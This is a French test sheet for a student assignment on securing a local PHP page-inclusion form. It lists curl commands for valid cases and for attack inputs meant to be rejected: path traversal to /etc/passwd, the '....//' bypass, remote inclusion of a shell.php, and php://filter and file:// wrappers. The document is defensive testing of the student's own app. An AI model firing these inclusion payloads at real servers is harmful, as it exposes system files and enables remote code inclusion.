# Commandes de test — Devoir inclusion sécurisée

**URL** : `http://127.0.0.1:8080/`  
**Projet** : `lfi-secure-lab` (Docker / PHP)  
**Fichiers autorisés** : `accueil.php`, `info.php`, `aide.php`

> Dans le formulaire, le champ attend un **nom de fichier** (ex. `accueil.php`),  
> **pas** une commande système (`ip a` est refusé — c’est normal).

---

## 0. Démarrer l’appli

```bash
cd lfi-secure-lab
docker compose up -d
docker compose ps
```

Arrêter :

```bash
docker compose down
```

Sans Docker :

```bash
cd lfi-secure-lab
php -S 0.0.0.0:8080
```

---

## 1. Cas valides (doivent réussir)

### Navigateur
Saisir puis **Valider** :
- `accueil.php`
- `info.php`
- `aide.php`

### curl

```bash
BASE=http://127.0.0.1:8080

curl -s -X POST -d "page=accueil.php&go=1" "$BASE/"
curl -s -X POST -d "page=info.php&go=1" "$BASE/"
curl -s -X POST -d "page=aide.php&go=1" "$BASE/"
```

Vérifier le message de succès :

```bash
curl -s -X POST -d "page=accueil.php&go=1" "$BASE/" | grep -i "succès\|Accueil"
```

---

## 2. Cas LFI / chemins interdits (doivent échouer)

```bash
BASE=http://127.0.0.1:8080

# Path traversal classique
curl -s -X POST --data-urlencode "page=../../etc/passwd" -d "go=1" "$BASE/"

# Variante
curl -s -X POST --data-urlencode "page=../../../../etc/passwd" -d "go=1" "$BASE/"

# Chemin absolu
curl -s -X POST --data-urlencode "page=/etc/passwd" -d "go=1" "$BASE/"

# Double dots encodés / variantes
curl -s -X POST --data-urlencode "page=....//....//etc/passwd" -d "go=1" "$BASE/"
```

**Attendu :** message d’erreur (caractères spéciaux / non alphabétique).  
**Pas** le contenu de `/etc/passwd`.

---

## 3. Cas RFI / wrappers (doivent échouer)

```bash
BASE=http://127.0.0.1:8080

curl -s -X POST --data-urlencode "page=http://exemple.com/shell.php" -d "go=1" "$BASE/"
curl -s -X POST --data-urlencode "page=https://exemple.com/x.php" -d "go=1" "$BASE/"
curl -s -X POST --data-urlencode "page=php://filter/resource=accueil.php" -d "go=1" "$BASE/"
curl -s -X POST --data-urlencode "page=file:///etc/passwd" -d "go=1" "$BASE/"
```

---

## 4. Cas validation du devoir (messages spécialisés)

```bash
BASE=http://127.0.0.1:8080

# Champ vide
curl -s -X POST -d "page=&go=1" "$BASE/"

# Trop long (> 20 caractères avec .php)
curl -s -X POST --data-urlencode "page=abcdefghijklmnopqrstuvwxyz.php" -d "go=1" "$BASE/"

# Pas alphabétique (chiffres)
curl -s -X POST -d "page=file1.php&go=1" "$BASE/"

# Caractères spéciaux / espace (ex. ce que tu as tapé : ip a)
curl -s -X POST --data-urlencode "page=ip a" -d "go=1" "$BASE/"

# Mauvaise extension
curl -s -X POST -d "page=accueil.txt&go=1" "$BASE/"
curl -s -X POST -d "page=test.jpg&go=1" "$BASE/"

# Format OK mais hors liste blanche
curl -s -X POST -d "page=secret.php&go=1" "$BASE/"
curl -s -X POST -d "page=admin.php&go=1" "$BASE/"
```

| Saisie | Cas de message attendu |
|--------|-------------------------|
| *(vide)* | Cas vide |
| `abcdefghijklmnopqrstuvwxyz.php` | Cas longueur |
| `ip a` / `../../etc/passwd` | Cas caractères spéciaux |
| `file1.php` | Cas alphabétique / spéciaux |
| `accueil.txt` | Cas extension |
| `secret.php` | Cas liste blanche |
| `accueil.php` | Cas succès |

---

## 5. Script rapide (tout enchaîner)

```bash
BASE=http://127.0.0.1:8080

echo "=== VALIDE ==="
curl -s -X POST -d "page=accueil.php&go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1

echo "=== LFI ==="
curl -s -X POST --data-urlencode "page=../../etc/passwd" -d "go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1

echo "=== LONGUEUR ==="
curl -s -X POST --data-urlencode "page=abcdefghijklmnopqrstuvwxyz.php" -d "go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1

echo "=== EXTENSION ==="
curl -s -X POST -d "page=test.txt&go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1

echo "=== LISTE BLANCHE ==="
curl -s -X POST -d "page=secret.php&go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1

echo "=== COMMANDE (ip a) — doit échouer ==="
curl -s -X POST --data-urlencode "page=ip a" -d "go=1" "$BASE/" | grep -oE "Cas [^<]+" | head -1
```

---

## 6. Captures utiles pour le rendu

1. Succès : `accueil.php`  
2. LFI bloquée : `../../etc/passwd`  
3. Longueur / extension / hors liste  
4. Saisie invalide type `ip a` (montre que ce n’est pas un shell)

---

*Fichier lié au projet `lfi-secure-lab` — devoir anti-LFI.*
